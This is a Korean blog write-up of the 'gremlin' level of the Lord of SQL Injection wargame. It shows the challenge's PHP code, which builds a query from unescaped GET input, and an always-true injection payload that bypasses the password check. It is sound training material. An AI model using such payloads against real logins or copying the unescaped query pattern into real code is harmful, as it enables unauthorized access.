---
title: "[Lord of SQL Injection] LoS - gremlin 문제풀이"
date: 2018-07-20
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

예전에 `LoS` 문제를 풀어본 적 있었다.
예전에는 다른 사이트였는데, 원작자가 새로운 문제를 추가 해 서비스를 시작했다 해서 다시 풀어보게 되었다.

<!--more-->

예전에는 [http://los.eagle-jump.org](http://los.eagle-jump.org)이었는데, 새로 원작자가 오픈 한 사이트 주소는 [http://los.rubiya.kr](http://los.rubiya.kr) 이다.  

`LoS`는 따로 플래그를 입력하는 방식이 아니라 코드 안의 `solve()` 함수가 동작하도록 하면 문제가 풀린다.
그리고 친절하게 내가 입력 한 값이 어떻게 쿼리에 들어가는지도 보여준다.

첫 번째 문제는 `gremlin`이다.
코드는 다음과 같다.  

```php
----------------------------------------------------------------------------
query : select id from prob_gremlin where id='' and pw=''
----------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

문제를 풀기 위해서는 `if($result['id']) solve("gremlin");`에서 조건문을 통과해야 한다.
즉, 쿼리를 실행했을 때 추출되는 id 값이 있으면 된다.
실행되는 쿼리는 다음과 같다.  

```php
select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
```

이 때, `id`와 `pw`의 값은 `GET` 방식으로 받아온다.
`id`가 뭐든 상관 없기때문에 그냥 쿼리 결과가 참이 될 수 있는 값을 입력하면 될 것 같다.
쿼리문을 완성하기 위해 아래와 같이 입력했다.  

```plain
?id=admin&pw=a' or 'a'='a
```

그 결과 아래와 같이 문제를 풀 수 있었다.  

```php
--------------------------------------------------------------------------------------------------
query : select id from prob_gremlin where id='admin' and pw='a' or 'a' = 'a'
--------------------------------------------------------------------------------------------------

GREMLIN Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

---

```plain
Gremlin Clear!!
```